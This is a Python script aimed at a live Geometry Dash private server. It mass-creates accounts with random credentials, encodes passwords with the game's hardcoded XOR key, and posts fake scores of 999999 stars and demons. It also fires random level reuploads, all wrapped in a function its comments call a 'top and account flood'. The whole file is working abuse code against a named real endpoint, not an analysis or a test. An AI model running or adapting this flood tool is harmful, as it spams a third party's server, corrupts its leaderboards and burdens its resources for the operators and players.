import requests
import random
import asyncio

endpoint = "https://wgdpsactive.7m.pl/database"

level_range = [73002458, 73004627]

def createAcc(userName, password, email):
    data = {
        'userName': userName,
        'password': password,
        'email': email
    }
    r = requests.post(endpoint+"/accounts/registerGJAccount.php", data=data)
    return r.text
def genSymbols(length=6):
    symbols = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890."
    GEN = ""
    for i in range(length):
        GEN += random.choice(symbols)
    return GEN
def loginAcc(userName, password):
    data = {
        'userName': userName,
        'password': password,
        'udid': genSymbols(20)
    }
    r = requests.post(endpoint+"/accounts/loginGJAccount.php", data=data)
    return r.text
async def levelReup(levelID):
    data = {
        'levelid': levelID,
        'server': 'http://www.boomlings.com/database/downloadGJLevel22.php',
        'debug': 0
    }
    method = "/tools/levelReupload.php"
    r = requests.post(endpoint+method, data=data)
    message = r.text.split("<br><hr>")[0].split("<body>")[1].split("</script>")[1].split("<br>")[0]
    print(message)
async def getSong(songID):
    data = {
        'songID': songID
    }
    method = "/getGJSongInfo.php"
    r = requests.post(endpoint+method, data=data)
    if(r.text=="-1"):
        print("Not found")
    elif(r.text=="-2"):
        print("Disabled")
    else:
        re = r.text.split("~|~")[1]+" - "+r.text.split("~|~")[3]
        print(re)
from itertools import cycle
def xor(data, key):
    return ''.join(chr(a ^ ord(b)) for (a, b) in zip(data, cycle(key)))
import base64
def gjp(password):
    gjp = password.encode()
    gjp = xor(gjp,'37526').encode()
    gjp = base64.b64encode(gjp).decode()
    return gjp
def updateScore(accountID, gjp, userName, stars, demons, icon, color1, color2):
    data = {
        'gameVersion': 21,
        'binaryVersion': 34,
        'userName': userName,
        'secret': 'shhhhh',
        'stars': stars,
        'demons': demons,
        'icon': icon,
        'color1': color1,
        'color2': color2,
        'accountID': accountID,
        'gjp': gjp
    }
    method = "/updateGJUserScore22.php"
    r = requests.post(endpoint+method, data=data)
    return r.text
async def flood():
    #top and account flood
    print("starting account flood")
    accountName = genSymbols(10)
    print(accountName)
    passwords = genSymbols(10)
    print(passwords)
    gjped = gjp(passwords)
    print(gjped)
    email = genSymbols(9)+"@"+genSymbols(9)+".com"
    createAcc(accountName, passwords, email)
    print("created account")
    acc = loginAcc(accountName, passwords)
    print(acc)
    accID = acc.split(",")[0]
    print(accID)
    print(updateScore(accID, gjped, accountName, 999999, 999999, 1, 1, 1))
    #additional
    print("starting additional flood")
    await levelReup(random.randint(level_range[0], level_range[1]))
    #if you need flood with songs it will speed down the process |await getSong(random.randint(111111,999999))

